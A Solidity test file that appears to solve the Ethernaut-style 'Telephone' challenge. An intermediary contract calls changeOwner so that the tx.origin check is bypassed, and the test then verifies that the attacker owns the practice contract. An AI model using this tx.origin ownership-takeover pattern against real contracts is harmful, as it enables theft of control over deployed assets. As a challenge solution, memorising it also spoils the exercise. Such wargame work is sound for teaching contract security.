// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Attack.sol";
import "./Telephone.sol";

contract Middleman {
  function attack(Telephone _instance, address _player) public {
    _instance.changeOwner(_player);
  }
}

contract TelephoneAttack is Attack {
  Telephone private _telephone;

  function setUp() public {
    vm.prank(owner);
    _telephone = new Telephone();
  }

  function test_attack() public {
    vm.startPrank(attacker);

    new Middleman().attack(_telephone, attacker);

    /*** Validation ***/
    assertFinished(address(_telephone));
  }

  function validateInstance(address payable _instance, address _player) override public view returns (bool) {
    Telephone instance = Telephone(_instance);
    return instance.owner() == _player;
  }
}
